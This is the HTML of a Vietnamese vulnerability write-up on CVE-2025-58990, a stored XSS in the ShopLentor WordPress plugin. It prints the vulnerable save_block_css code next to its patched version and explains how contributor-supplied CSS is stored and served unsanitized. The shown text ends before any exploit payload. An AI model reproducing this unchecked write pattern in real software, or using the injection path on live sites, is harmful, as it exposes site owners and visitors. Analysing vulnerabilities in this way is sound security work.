<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2025-58990 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress ShopLentor Plugin."><meta property="og:url" content="http://localhost:1313/vi/2025-10-05-cve-2025-58990/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2025-58990 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress ShopLentor Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-05T22:45:00+07:00">
    <meta property="article:modified_time" content="2025-10-05T22:45:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Xss">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2025-58990 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress ShopLentor Plugin.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" /><link rel="prev" href="http://localhost:1313/vi/2025-10-04-cve-2025-27006/" /><link rel="next" href="http://localhost:1313/vi/2025-10-06-cve-2025-10146/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2025-58990 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-10-05-cve-2025-58990\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, xss","wordcount":  1411 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-10-05-cve-2025-58990\/","datePublished": "2025-10-05T22:45:00+07:00","dateModified": "2025-10-05T22:45:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress ShopLentor Plugin."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-10-05-cve-2025-58990/">English</option><option value="/vi/2025-10-05-cve-2025-58990/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-10-05-cve-2025-58990/">English</option><option value="/vi/2025-10-05-cve-2025-58990/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2025-58990 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-10-05">2025-10-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1411 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-10-05-cve-2025-58990/app.png"
        data-srcset="/2025-10-05-cve-2025-58990/app.png, /2025-10-05-cve-2025-58990/app.png 1.5x, /2025-10-05-cve-2025-58990/app.png 2x"
        data-sizes="auto"
        alt="/2025-10-05-cve-2025-58990/app.png"
        title="Security Vulnerability in WordPress ShopLentor Plugin." width="1544" height="500" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How It Work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-xss">Detect XSS</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Lỗ hổng trong plugin <strong>ShopLentor</strong> trước phiên bản <strong>3.2.0</strong> cho phép kẻ tấn công có quyền <strong>contributor</strong> chèn mã độc vào CSS của block. CSS này sau đó được nạp inline vào trang và có khả năng dẫn tới Stored XSS khi được preview hoặc hiển thị trong trình duyệt.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-58990" target="_blank" rel="noopener noreffer ">CVE-2025-58990</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/woolentor-addons/" target="_blank" rel="noopener noreffer ">WordPress ShopLentor Plugin</a></li>
<li><strong>Vulnerability Type</strong>: Cross Site Scripting</li>
<li><strong>Affected Versions</strong>: &lt;= 3.2.0</li>
<li><strong>CVSS severity</strong>: Low (6.5)</li>
<li><strong>Required Privilege</strong>: Contributor</li>
</ul>
<hr>
<h2 id="requirements">Requirements</h2>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>ShopLentor</strong>: v3.2.0(vul) và v3.2.1(fix)</li>
<li><strong>diff tool</strong>: <strong>meld</strong> hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version</li>
<li><strong>Actived WooCommerce plugin</strong>: plugin bắt buộc <strong>actived</strong> trước khi cài <strong>ShopLentor Plugin</strong></li>
</ul>
<hr>
<h2 id="analysis">Analysis</h2>
<h3 id="patch-diff">Patch Diff</h3>
<p>Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file <strong>woolentor-blocks/includes/classes/Manage_Styles.php</strong>.</p>
<p><strong>Bản lỗi</strong>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save_block_css</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span> 	<span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$post_id</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Không kiểm tra quyền user
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Không lọc nội dung CSS trước khi lưu
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p><strong>Bản vá</strong>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save_block_css</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span> 	<span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$post_id</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Chỉ admin hoặc tác giả bài viết mới được phép
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$post</span> <span class="o">=</span> <span class="nx">get_post</span><span class="p">(</span> <span class="nv">$post_id</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$post</span> <span class="o">||</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">current_user_can</span><span class="p">(</span><span class="s1">&#39;manage_options&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">get_current_user_id</span><span class="p">()</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$post</span><span class="o">-&gt;</span><span class="na">post_author</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;No permission&#39;</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Lọc dữ liệu trước khi lưu
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$block_css</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize_css_content</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span><span class="p">,</span> <span class="nv">$block_css</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$block_css</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Bản vá dùng <code>current_user_can(manage_options)</code> để kiểm tra có phải <strong>admin</strong> không</p>
<ul>
<li>Nếu user là <strong>admin</strong> =&gt; vế đầu <code>! current_user_can('manage_options') = false</code> =&gt; cả biểu thức <code>&amp;&amp; = false</code> =&gt; qua được.</li>
<li>Nếu user là <strong>author</strong> =&gt; vế sau <code>get_current_user_id() !== (int) $post-&gt;post_author = false</code> =&gt; cả biểu thức <code>&amp;&amp; = false</code> =&gt; qua được.</li>
</ul>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/patch_diff.png" title="Patch Diff" data-thumbnail="/2025-10-05-cve-2025-58990/patch_diff.png" data-sub-html="<h2>Patch Diff</h2><p>Patch Diff</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/patch_diff.png"
            data-srcset="/2025-10-05-cve-2025-58990/patch_diff.png, /2025-10-05-cve-2025-58990/patch_diff.png 1.5x, /2025-10-05-cve-2025-58990/patch_diff.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/patch_diff.png" width="1780" height="809" />
    </a><figcaption class="image-caption">Patch Diff</figcaption>
    </figure></p>
<h3 id="how-it-work">How It Work?</h3>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save_block_css</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$wp_filesystem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$wp_filesystem</span> <span class="o">||</span> <span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;WP_Filesystem&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">require_once</span><span class="p">(</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;wp-admin/includes/file.php&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$params</span> 	<span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$post_id</span> 	<span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$post_id</span> <span class="o">==</span> <span class="s1">&#39;woolentor-widget&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;has_block&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">update_option</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Widget CSS Saved.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> 		<span class="o">=</span> <span class="s2">&#34;woolentor-css-</span><span class="si">{</span><span class="nv">$post_id</span><span class="si">}</span><span class="s2">.css&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$upload_dir_url</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dirname</span> 		<span class="o">=</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$upload_dir_url</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;woolentor-addons/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;has_block&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_active&#39;</span><span class="p">,</span> <span class="s1">&#39;yes&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$all_block_css</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">WP_Filesystem</span><span class="p">(</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$upload_dir_url</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">],</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span> <span class="o">!</span> <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">is_dir</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">mkdir</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span><span class="p">,</span> <span class="nv">$all_block_css</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$all_block_css</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;You are not permitted to save CSS.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span> <span class="p">)</span> <span class="p">);</span> 
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;WooLentor Blocks css file update.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">delete_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_active&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$dirname</span><span class="o">.</span><span class="nv">$filename</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">wp_delete_file</span><span class="p">(</span> <span class="nv">$dirname</span><span class="o">.</span><span class="nv">$filename</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nx">delete_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;WooLentor Blocks CSS Delete.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span> <span class="nx">\Exception</span> <span class="nv">$e</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Hàm <code>save_block_css()</code> thuộc class <code>Manage_Styles</code> có nhiệm vụ lưu hoặc xóa CSS tuỳ theo block.</p>
<p>Ứng dụng sẽ lấy <code>post_id</code> và nội dung <code>block_css</code> từ request.</p>
<p><strong>Trường hợp đặc biệt</strong>: nếu <code>post_id = woolentor-widget</code> =&gt; lưu CSS vào <code>wp_options</code></p>
<p><strong>Trường hợp bài viết thường</strong>:</p>
<ul>
<li>
<p>Nếu có block (<code>has_block = true</code>):</p>
<ul>
<li>Đánh dấu post đang active (<code>_woolentor_active</code>).</li>
<li>Lưu CSS vào bảng <code>wp_postmeta</code> với <code>meta_key</code> là <code>_woolentor_css</code>.</li>
</ul>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
